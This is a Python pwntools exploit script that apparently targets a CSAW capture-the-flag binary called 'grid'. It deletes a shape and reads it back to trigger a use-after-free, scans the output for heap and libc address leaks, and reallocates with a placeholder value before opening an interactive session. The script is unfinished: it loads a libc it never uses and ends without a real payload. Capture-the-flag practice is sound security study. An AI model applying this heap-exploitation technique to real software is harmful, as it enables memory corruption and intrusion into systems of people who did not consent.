#!/usr/bin/env python3
from pwn import *

exe = ELF('./ctf_files/grid')
libc = ELF('./ctf_files/libc-2.27.so')

context.binary = exe
context.log_level = 'debug'

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("pwn.chal.csaw.io", 8000)

def create_rectangle(p, width, height, content):
    p.recvuntil(b'choice: ')
    p.sendline(b'1')  # Create shape
    p.recvuntil(b'type: ')
    p.sendline(b'1')  # Rectangle
    p.recvuntil(b'width: ')
    p.sendline(str(width).encode())
    p.recvuntil(b'height: ')
    p.sendline(str(height).encode())
    p.recvuntil(b'content: ')
    p.send(content)
    return p.recvuntil(b'choice: ')

def delete_shape(p, idx):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    return p.recvuntil(b'choice: ')

def display_shape(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    return p.recvuntil(b'choice: ')

def main():
    p = conn()

    # Create a rectangle with controlled size to get heap allocation
    log.info("Creating rectangle 1...")
    create_rectangle(p, 4, 4, b"A" * 0x20)

    # Create second rectangle
    log.info("Creating rectangle 2...")
    create_rectangle(p, 4, 4, b"B" * 0x20)

    # Delete first rectangle to create UAF
    log.info("Deleting rectangle 1...")
    delete_shape(p, 0)

    # Try to read back the deleted rectangle to get heap leak
    log.info("Attempting to leak memory...")
    leak_data = display_shape(p, 0)

    # Look for leaked addresses in the output
    leak_data = leak_data.split(b'\n')
    for line in leak_data:
        try:
            if len(line) >= 8:
                leak = u64(line.ljust(8, b'\x00'))
                if leak > 0x7f0000000000:
                    log.success(f"Potential libc leak: {hex(leak)}")
                elif leak > 0x400000:
                    log.success(f"Potential heap leak: {hex(leak)}")
        except:
            continue

    # Create new rectangle to trigger UAF
    log.info("Creating rectangle 3 to trigger UAF...")
    create_rectangle(p, 4, 4, p64(0x4141414141414141))

    p.interactive()

if __name__ == '__main__':
    main()

